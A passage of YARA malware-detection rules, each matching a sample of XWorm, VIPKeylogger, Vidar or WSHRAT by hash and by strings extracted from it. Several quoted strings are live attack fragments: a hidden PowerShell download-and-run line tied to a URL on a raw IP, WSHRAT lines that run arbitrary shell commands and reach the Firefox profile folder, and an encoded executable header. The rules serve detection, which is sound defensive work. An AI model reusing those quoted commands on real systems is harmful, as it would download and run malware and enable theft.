      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8fa6a5b3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8fa6a5b34fac89062c13172061b58a0afeb4c034edf3a2de0f8c3a37ba444419"
   strings:
      $s1 = "ExecuteSeparatedCommand" fullword ascii /* score: '26.00'*/
      $s2 = "Vmyfa.Execution" fullword ascii /* score: '23.00'*/
      $s3 = "dont.exe" fullword wide /* score: '22.00'*/
      $s4 = "RunOperationalLogger" fullword ascii /* score: '22.00'*/
      $s5 = "System.Collections.Generic.IEnumerable<System.Net.IPAddress>.GetEnumerator" fullword ascii /* score: '21.00'*/
      $s6 = "RunPortableCommand" fullword ascii /* score: '18.00'*/
      $s7 = "ExecuteInterpreter" fullword ascii /* score: '18.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<System.Net.IPNetwork>.GetEnumerator" fullword ascii /* score: '18.00'*/
      $s9 = "CreateControllableExecutor" fullword ascii /* score: '16.00'*/
      $s10 = "CustomizeExecutor" fullword ascii /* score: '16.00'*/
      $s11 = "RunHiddenExecutor" fullword ascii /* score: '16.00'*/
      $s12 = "LogInterruptibleWriter" fullword ascii /* score: '15.00'*/
      $s13 = "RunSequentialCommand" fullword ascii /* score: '15.00'*/
      $s14 = "fieldProcessor" fullword ascii /* score: '15.00'*/
      $s15 = "RunEfficientCommand" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__28e4ad78 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_28e4ad78.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "28e4ad78f2695b75e4fb2a15ff7fdccc8bcdb23f9b53a1757bd169f57f6a91c1"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '24.00'*/
      $s4 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "OkiIcMICZUd4ynf.exe" fullword wide /* score: '22.00'*/
      $s7 = "Process " fullword wide /* score: '15.00'*/
      $s8 = "System.Globalization.TextInfo%System.Globalization.NumberFormatInfo'System.Globalization.DateTimeFormatInfo&System.Globalization" ascii /* score: '14.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s11 = "(System.Globalization.DateTimeFormatFlags" fullword ascii /* score: '11.00'*/
      $s12 = "XX[[[X" fullword ascii /* reversed goodware string 'X[[[XX' */ /* score: '11.00'*/
      $s13 = "'System.Globalization.DateTimeFormatInfo+" fullword ascii /* score: '11.00'*/
      $s14 = "kernel " fullword wide /* score: '11.00'*/
      $s15 = " System.Globalization.SortVersion" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e3a37c04 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e3a37c04.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e3a37c04b6c0e5081c5570e395b0f541efe1ce32c7f4f822a8d07aac5930a406"
   strings:
      $s1 = "SvNJeTsxCFkmlwEtxrC.zeHErYstfZWGLLfR1r8+LwhevLSyM6689K9wdeD+LvRfu6S3pXv6QdUjbBB`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "XoeB.exe" fullword wide /* score: '22.00'*/
      $s3 = "SvNJeTsxCFkmlwEtxrC.zeHErYstfZWGLLfR1r8+LwhevLSyM6689K9wdeD+LvRfu6S3pXv6QdUjbBB`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s4 = "Process " fullword wide /* score: '15.00'*/
      $s5 = "GetUnitDescription" fullword ascii /* score: '15.00'*/
      $s6 = "ture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s7 = "GetConversions" fullword ascii /* score: '12.00'*/
      $s8 = "GetRecentConversions" fullword ascii /* score: '12.00'*/
      $s9 = "GetMostUsedConversions" fullword ascii /* score: '12.00'*/
      $s10 = "kernel " fullword wide /* score: '11.00'*/
      $s11 = "FVgETmNC7" fullword ascii /* score: '10.00'*/
      $s12 = "get_SaveHistory" fullword ascii /* score: '9.00'*/
      $s13 = "reYendSTYr0yXlZ2RNj" fullword ascii /* score: '9.00'*/
      $s14 = "VorFB9mD4KTABFDllF0" fullword ascii /* score: '9.00'*/
      $s15 = "j9C5sfFTp5W4cdITM8e" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule XWorm_signature__112bfbb18727302cb5425c20a464b02e_imphash__898dd28e {
   meta:
      description = "_subset_batch - file XWorm(signature)_112bfbb18727302cb5425c20a464b02e(imphash)_898dd28e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "898dd28e3c6ea2bbf2a3274bdc8a5d76e60f8c68eb1a16749090c8273fe3264f"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArch" ascii /* score: '45.00'*/
      $s2 = "tInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiA" ascii /* score: '26.00'*/
      $s3 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s4 = "s=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-" ascii /* score: '22.00'*/
      $s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArch" ascii /* score: '22.00'*/
      $s6 = "D:\\T\\M\\BuildResults\\bin\\Release_x64\\AcrobatInfo.pdb" fullword ascii /* score: '22.00'*/
      $s7 = "AcrobatInfo.exe" fullword wide /* score: '22.00'*/
      $s8 = "-theThing.exe" fullword ascii /* score: '19.00'*/
      $s9 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s10 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s11 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii /* score: '16.00'*/
      $s12 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii /* score: '16.00'*/
      $s13 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s14 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii /* score: '16.00'*/
      $s15 = "D$X.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 10 of them
}

rule VIPKeylogger_signature__f10c3f6d {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f10c3f6d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f10c3f6d8400f5ded7232f4af6de612ac7dbc9d593a7f73b957d4a08585e30fe"
   strings:
      $x1 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null, 48)" ascii /* score: '34.00'*/
      $s2 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" fullword ascii /* score: '27.00'*/
      $s3 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s4 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s5 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null, 4" ascii /* score: '27.00'*/
      $s6 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48));" fullword ascii /* score: '27.00'*/
      $s7 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null, 4" ascii /* score: '27.00'*/
      $s8 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" fullword ascii /* score: '26.00'*/
      $s9 = "var Croydon = trichomania.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s10 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s11 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null, 48)" ascii /* score: '25.00'*/
      $s12 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '24.00'*/
      $s13 = "                                console.log(\"    \" + bowget + \": \" + pad.substr(0, abjecting - bowget.length) + orthopnea[to" ascii /* score: '24.00'*/
      $s14 = "                                console.log(\"    \" + bowget + \": \" + pad.substr(0, abjecting - bowget.length) + orthopnea[to" ascii /* score: '24.00'*/
      $s15 = "                    var insculpsit = new Enumerator(storeys.ExecQuery(\"Select * from Win32_NTLogEvent\", null, 48));" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__dd526d6b {
   meta:
      description = "_subset_batch - file XWorm(signature)_dd526d6b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd526d6b1e6b225b484425cfce62bc318dae7ad5356e81587a511394a3e34aa0"
   strings:
      $x1 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", nu" ascii /* score: '34.00'*/
      $x2 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", nu" ascii /* score: '34.00'*/
      $s3 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s4 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", " ascii /* score: '27.00'*/
      $s5 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, " ascii /* score: '27.00'*/
      $s6 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, " ascii /* score: '27.00'*/
      $s7 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", " ascii /* score: '27.00'*/
      $s8 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48)" ascii /* score: '27.00'*/
      $s9 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s10 = "var photoexcites = mismatches.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s11 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48)" ascii /* score: '26.00'*/
      $s12 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", nu" ascii /* score: '25.00'*/
      $s13 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s14 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", nu" ascii /* score: '25.00'*/
      $s15 = "                    var nondistorters = new Enumerator(procuration.ExecQuery(\"Select * from Win32_NTLogEvent\", null, 48));" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f858bfe2 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f858bfe2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f858bfe2ddeed4981729b15997f20971a85cb174e7ce195ff83c9a7d04470bff"
   strings:
      $x1 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null, 48)" ascii /* score: '34.00'*/
      $s2 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null, 4" ascii /* score: '27.00'*/
      $s3 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s4 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null, 4" ascii /* score: '27.00'*/
      $s5 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48));" fullword ascii /* score: '27.00'*/
      $s6 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" fullword ascii /* score: '27.00'*/
      $s7 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s8 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" fullword ascii /* score: '26.00'*/
      $s9 = "var clownage = corpectomy.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s10 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s11 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null, 48)" ascii /* score: '25.00'*/
      $s12 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '24.00'*/
      $s13 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_NTLogEvent\", null, 48));" fullword ascii /* score: '24.00'*/
      $s14 = "var mirthlessly = corpectomy.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s15 = "                    var neofiber = new Enumerator(weighable.ExecQuery(\"Select * from Win32_PortConnector\", null, 48));" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4f8eb431 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4f8eb431.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4f8eb431e07cc4c69fc41ea1e564f99651dc65931073429de3e532a904fb0ce5"
   strings:
      $s1 = "qqZN.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s7 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s8 = "csvContent" fullword ascii /* score: '9.00'*/
      $s9 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s10 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s11 = "Pspy{Weic" fullword ascii /* score: '9.00'*/
      $s12 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__646167cce332c1c252cdcb1839e0cf48_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd62b3f937dbf381f63a8da4b39442285ad13702fe2ac855dab61d3b7a0f23ec"
   strings:
      $s1 = " Shell32.DLL " fullword wide /* score: '24.00'*/
      $s2 = "1G11F4.exe" fullword ascii /* score: '19.00'*/
      $s3 = "2X6168.exe" fullword ascii /* score: '19.00'*/
      $s4 = " OpenProcessToken.3" fullword wide /* score: '18.00'*/
      $s5 = " advpack.dll.H" fullword wide /* score: '16.00'*/
      $s6 = " Command /?." fullword wide /* score: '14.00'*/
      $s7 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s8 = "  <description>IExpress extraction tool</description>" fullword ascii /* score: '10.00'*/
      $s9 = "          processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s10 = "DSystem\\CurrentControlSet\\Control\\Session Manager" fullword ascii /* score: '10.00'*/
      $s11 = "     processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s12 = "aEtp0c:&i" fullword ascii /* score: '9.00'*/
      $s13 = "zxV) -d " fullword ascii /* score: '9.00'*/
      $s14 = " Windows NT." fullword wide /* score: '9.00'*/
      $s15 = "/Q -- " fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule XWorm_signature__112bfbb18727302cb5425c20a464b02e_imphash__a42cb3fb {
   meta:
      description = "_subset_batch - file XWorm(signature)_112bfbb18727302cb5425c20a464b02e(imphash)_a42cb3fb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a42cb3fb3abf5df706c6f8c8fa590aa5bd76f98f328bf602037bb9208e580d98"
   strings:
      $s1 = "Support@eFigureOut.com" fullword wide /* score: '21.00'*/
      $s2 = "-theThing.exe" fullword ascii /* score: '19.00'*/
      $s3 = "MouseLocator.EXE" fullword wide /* score: '18.00'*/
      $s4 = "https://plusone.google.com/_/+1/confirm?hl=en&url=http//efigureout.com/" fullword ascii /* score: '17.00'*/
      $s5 = "D$X.exe" fullword ascii /* score: '16.00'*/
      $s6 = "About Mouse Locator by eFigureOut.com" fullword wide /* score: '14.00'*/
      $s7 = "Mouse Locator by eFigureOut.com" fullword wide /* score: '14.00'*/
      $s8 = "PADPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADD" ascii /* score: '12.00'*/
      $s9 = "Could Not Get Mouse Cursor Position, Error %x" fullword ascii /* score: '12.00'*/
      $s10 = "Mouse Cursor at X = %d, Y = %d" fullword ascii /* score: '9.50'*/
      $s11 = "Syka blyat. Fuck all. Made in Russia. Neshta_v3" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule Vidar_signature__c673ef005c8b05c71b0d297e41175e1b_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_c673ef005c8b05c71b0d297e41175e1b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "58817bec65f9b5e99077cea5c6fff5fb68af2179b3df84897e04a648687deaf0"
   strings:
      $s1 = "Screenshoter.exe" fullword wide /* score: '22.00'*/
      $s2 = "SWSSSSSSSSVS" fullword ascii /* reversed goodware string 'SVSSSSSSSSWS' */ /* score: '16.50'*/
      $s3 = "Screenshoter: Screen Uploader" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      all of them
}

rule XWorm_signature__4cea7ae85c87ddc7295d39ff9cda31d1_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_4cea7ae85c87ddc7295d39ff9cda31d1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fc9fac3327bd128f91307ae1d251340fbf803759d96a88ff9a1694406a164cef"
   strings:
      $x1 = "powershell.exe -windowstyle hidden -command \"Invoke-WebRequest -Uri '%url1%' -OutFile '%output1%' -UseBasicParsing\"" fullword ascii /* score: '35.00'*/
      $s2 = "set \"output1=%APPDATA%\\MicrosoftSvce.exe\"" fullword ascii /* score: '25.00'*/
      $s3 = "cmd /c \"karra.bat\"" fullword ascii /* score: '24.00'*/
      $s4 = "set \"url1=http://104.238.215.171/pospos_build.exe\"" fullword ascii /* score: '19.00'*/
      $s5 = "karra.bat" fullword ascii /* score: '18.00'*/
      $s6 = "P%UserQuietInstCmd%" fullword ascii /* score: '14.00'*/
      $s7 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s8 = "          processorArchitecture=\"amd64\"" fullword ascii /* score: '10.00'*/
      $s9 = "  <description>IExpress extraction tool</description>" fullword ascii /* score: '10.00'*/
      $s10 = "     processorArchitecture=\"amd64\"" fullword ascii /* score: '10.00'*/
      $s11 = "start /min \"\" \"%output1%\"" fullword ascii /* score: '8.00'*/
      $s12 = "          publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s13 = "  <assemblyIdentity version=\"5.1.0.0\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__927ee2ef {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_927ee2ef.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "927ee2efc981ff533b8af71f12802949bbe4b5d6032759dc15503338efb40047"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD^V" fullword ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s5 = "Gmo.exe" fullword wide /* score: '19.00'*/
      $s6 = "!!!5!!!5!!!" fullword ascii /* score: '18.00'*/ /* hex encoded string 'U' */
      $s7 = "https://www.facebook.com/mohammed.telkhoukhe" fullword wide /* score: '17.00'*/
      $s8 = "https://www.instagram.com/m.tel18/" fullword wide /* score: '17.00'*/
      $s9 = "https://www.linkedin.com/in/mohamed-telkhoukhe-419019246/" fullword wide /* score: '17.00'*/
      $s10 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s11 = "logoPictureBox.Image" fullword wide /* score: '12.00'*/
      $s12 = "Gmo.pdb" fullword ascii /* score: '11.00'*/
      $s13 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s14 = "!!!(!!!" fullword ascii /* score: '10.00'*/
      $s15 = "!!!O!!!" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b6e5f2f7 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b6e5f2f7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6e5f2f7859204a896314a1d69c4f6f496c93060bb96ffeeebc0c0e2b02ab785"
   strings:
      $s1 = "Nezasaheditor.frmMain+VB$StateMachine_349_HandleFinderCompletion, Bo3dba, Version=11.23.34.21, Culture=neutral, PublicKeyToken=n" ascii /* score: '27.00'*/
      $s2 = "Nezasaheditor.frmMain+VB$StateMachine_349_HandleFinderCompletion, Bo3dba, Version=11.23.34.21, Culture=neutral, PublicKeyToken=n" ascii /* score: '27.00'*/
      $s3 = "smtp.uni-latex.com" fullword wide /* score: '26.00'*/
      $s4 = "Nezasaheditor.exe" fullword wide /* score: '22.00'*/
      $s5 = "\\Connection Tru Text\\LogString.txt" fullword wide /* score: '20.00'*/
      $s6 = "allan@uni-latex.com" fullword wide /* score: '18.00'*/
      $s7 = "hodiumalchest@gmail.com" fullword wide /* score: '18.00'*/
      $s8 = "Pendiente" fullword wide /* base64 encoded string */ /* score: '16.00'*/
      $s9 = "\\Connection Tru Text\\ConnectionStrings.txt" fullword wide /* score: '15.00'*/
      $s10 = "Re3woWy59bSs" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s11 = "ShellOpenFile" fullword wide /* score: '14.00'*/
      $s12 = "Select target directory" fullword wide /* score: '14.00'*/
      $s13 = "PASSWORD :" fullword wide /* score: '12.00'*/
      $s14 = "Insert PASSWORD" fullword wide /* score: '12.00'*/
      $s15 = "Rz5kaSg09" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule VIPKeylogger_signature__6e7f9a29f2c85394521a08b9f31f6275_imphash_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_6e7f9a29f2c85394521a08b9f31f6275(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1b9145fa74e3de7a84fc8f5ceb78361817cb138bb06dfc6febb94b80e923b5c3"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.07</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "* nJ:qHJ" fullword ascii /* score: '9.00'*/
      $s4 = "chappin" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule WSHRAT_signature_ {
   meta:
      description = "_subset_batch - file WSHRAT(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "099a2c513d4d08ef9b9c0cabcd79c97776df80098c2f9cf109c799d5fd234fa4"
   strings:
      $x1 = "var encoded = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBw" ascii /* score: '86.00'*/
      $x2 = "shellobj.run(\"%comspec% /c cd \\\"\" + sdkpath + \"\\\" && \" + gsp(sdkfile) + \" \" + gsp(installdir + \"rundll\") + \" > \\\"" ascii /* score: '47.00'*/
      $x3 = "shellobj.run(\"%comspec% /c cd \\\"\" + sdkpath + \"\\\" && \" + gsp(sdkfile) + \" \" + gsp(installdir + \"rundll\") + \" > \\\"" ascii /* score: '47.00'*/
      $x4 = "shellobj.run(\"%comspec% /c taskkill /F /IM \" + filename, 0, true);" fullword ascii /* score: '43.00'*/
      $x5 = "  shellobj.run(\"%comspec% /c taskkill /F /IM rprox.exe\", 0, true);" fullword ascii /* score: '43.00'*/
      $x6 = "folder = shellobj.ExpandEnvironmentStrings(\"%appdata%\") + \"\\\\Mozilla\\\\Firefox\\\\\";" fullword ascii /* score: '40.00'*/
      $x7 = "shellobj.run(\"%comspec% /c mkdir \\\"\" + folder + \"\\\"\", 0, true);" fullword ascii /* score: '39.00'*/
      $x8 = "shellobj.run(\"%comspec% /c \" + cmd[2], 0, true);" fullword ascii /* score: '39.00'*/
      $x9 = "shellobj.run(\"%comspec% /c \" + cmd + \" > \\\"\" + strsaveto + \"\\\"\", 0, true);" fullword ascii /* score: '39.00'*/
      $x10 = "    shellobj.run(\"%comspec% /c taskkill /F /IM \" + filename, 0, true);" fullword ascii /* score: '38.00'*/
